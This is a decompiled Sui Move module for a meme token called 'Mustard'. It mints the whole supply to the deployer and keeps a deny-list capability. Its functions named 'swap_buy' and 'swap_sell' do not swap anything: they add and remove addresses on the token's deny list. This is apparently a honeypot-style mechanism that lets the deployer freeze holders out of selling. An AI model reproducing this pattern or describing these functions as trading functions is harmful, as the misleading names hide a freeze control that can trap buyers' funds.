module 0xe7edb9e9d82c7ae01b57a6bb5ec25f6591f3278a4803ffb31dd83c2214428e2::mustard {
    struct MUSTARD has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: MUSTARD, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<MUSTARD>(arg0, 9, b"Mustard", b"MUSTAAAAAARD", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmR8gUEnmAyngc7cXqKxqffdTUnTtdvkXSHwDUtC9Wf6ft"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<MUSTARD>(&mut v3, 420690000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<MUSTARD>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<MUSTARD>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<MUSTARD>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MUSTARD>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<MUSTARD>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MUSTARD>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<MUSTARD>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

